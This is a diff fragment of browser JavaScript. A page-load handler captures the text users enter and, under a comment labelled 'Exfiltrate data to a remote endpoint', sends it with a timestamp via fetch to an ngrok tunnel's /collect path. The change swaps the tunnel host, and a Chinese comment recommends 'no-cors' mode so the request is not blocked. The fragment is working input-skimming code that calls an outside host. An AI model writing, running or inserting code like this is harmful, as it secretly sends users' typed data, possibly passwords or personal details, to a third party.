@@ -13,7 +13,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const text = e.target.value;
 
     // 3. Exfiltrate data to a remote endpoint
-    fetch("https://cffbc49a47ea.ngrok-free.app/collect?" +
+    fetch("https://ffe5c2603bf8.ngrok-free.app/collect?" +
       "text=" + encodeURIComponent(text) +
       "&timestamp=" + encodeURIComponent(new Date().toISOString()),
       { mode: 'no-cors' } // 建議加上這個，避免 ngrok 的 CORS 擋住請求
